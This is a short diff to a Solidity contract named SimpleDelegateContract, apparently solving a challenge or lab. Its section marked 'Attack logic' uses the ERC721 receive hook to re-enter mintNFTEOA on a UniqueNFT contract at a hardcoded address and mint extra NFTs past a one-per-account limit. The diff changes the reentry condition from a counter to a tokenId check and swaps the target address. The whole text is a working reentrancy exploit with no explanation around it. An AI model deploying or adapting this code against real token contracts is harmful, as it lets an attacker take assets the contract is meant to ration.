@@ -14,22 +14,18 @@ contract SimpleDelegateContract is IERC721Receiver {
     }
 
     // --- Attack logic ---
-    UniqueNFT public constant uniqueNFT = UniqueNFT(0x618a25994cCBdd9724583d6d202339A7A0d1fA13);
-    address public owner;
-    uint256 public reentryCount;
-    uint256 public constant MAX_REENTRY = 1;
+    // UniqueNFT address is hardcoded in onERC721Received
 
     // ERC721 Receiver hook
     function onERC721Received(
         address /*operator*/, 
         address /*from*/, 
-        uint256 /*tokenId*/, 
+        uint256 tokenId, 
         bytes calldata /*data*/
     ) external override returns (bytes4) {
-        if (reentryCount < MAX_REENTRY) {
-            reentryCount++;
-            // Re-enter mintNFTEOA to mint a second NFT
-            uniqueNFT.mintNFTEOA();
+        if (tokenId < 2) {
+            // Re-enter mintNFTEOA to mint another NFT
+            UniqueNFT(0xB8CF7547Fb6E6e5E9B456Dc12D126f2BAB26F9f1).mintNFTEOA();
         }
         return this.onERC721Received.selector;
     }
